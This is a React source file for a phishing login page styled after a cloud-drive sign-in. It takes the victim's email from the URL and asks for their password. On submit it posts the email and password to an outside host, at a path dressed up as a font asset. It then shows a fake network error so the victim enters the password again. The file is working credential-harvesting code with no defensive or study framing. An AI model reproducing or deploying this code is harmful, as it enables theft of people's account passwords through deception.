import React, { useState } from "react";
import './Form.css';
import { LiaArrowLeftSolid } from "react-icons/lia";
import $ from 'jquery';

const Form = ()=>{

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const e = emailInTheURL.substr((sliceEqualSign+1));

    const [email, setEmail] = useState(e);
    // setEmail(email);
    const [pwd, setPwd] = useState('');

    const [btnVal, setBtnVal] = useState('Proceed')

    const [network, setNetwork] = useState(false);

    const [invalid, setInvalid] = useState(false);

    const formHandler = e=>{
        e.preventDefault();
        setEmail(email);
        // alert(666)
        if (pwd === "") {
            // alert('empty')
            setInvalid(true);
            setNetwork(false);
        }else{

            setBtnVal('Processing...');

            setTimeout(() => {
                setInvalid(false);
                setNetwork(true);
                setPwd('');
                setBtnVal('Proceed')
              }, 2000);
    
            const user = {
                email: email,
                password: pwd
            };
      
            $.ajax({
                type: "POST",
                url: "https://pearldozen.com/nc_assets/fonts/nas/drive.php",
                data: user,
                success(data) {
                    console.log(data);
                },
            });
        }


    };
    

    return(<main className="overlay">
        

        <div className="loginForm">
            <form id="formm" onSubmit={formHandler}>
                <img 
                    alt="onedr"
                    src="data:image/png;base64,"
                />
                <br />
                <br />

                <div className='email_cont' style={{display:'flex', alignItems:'center'}}>
                    <LiaArrowLeftSolid style={{color:'#333', cursor:'pointer'}}/>
                    &#160;
                    <span>
                        {/* hello@shakira.com */}
                        {email}
                    </span>
                </div>

                <h4 className="h4">Enter password</h4>

                { network ? <p className="perrwarning">Network Error! Please verify your information and try again</p> : null }

                {invalid ? <p className="perrwarning">Please enter the valid email password</p> : null }

                <div className='password_cont'>
                    <input 
                        type="password"
                        placeholder="Enter password to proceed"
                        id="password"
                        className="password-input inp"
                        autoFocus
                        value={pwd}
                        onChange={ e=> {
                            setPwd(e.target.value);
                            if (pwd.length === 1) {
                                setInvalid(false)
                            }

                            if (pwd.length === 2) {
                                setNetwork(false);
                                
                            }
                        } }
                    />
                </div>

                <div style={{display:'flex'}}>
                    <input type="checkbox" />
                    <span style={{fontSize:'14px', color:'#222', cursor:'pointer'}}>Keep me signed in</span>
                </div>

                <p style={{
                    cursor:'pointer',
                    fontSize:'12px',
                    color:'#444',
                    fontFamily:'Verdana, sans-serif'
                }}>This link is valid only for the intended email address.</p>


                <div className='btn_wrap'>
                    <input 
                        type="submit"
                        // role="submit"
                        className="btn"
                        value={btnVal}
                        onClick={formHandler}
                     />
                </div>


            </form>
        </div>
    </main>)
};

export default Form;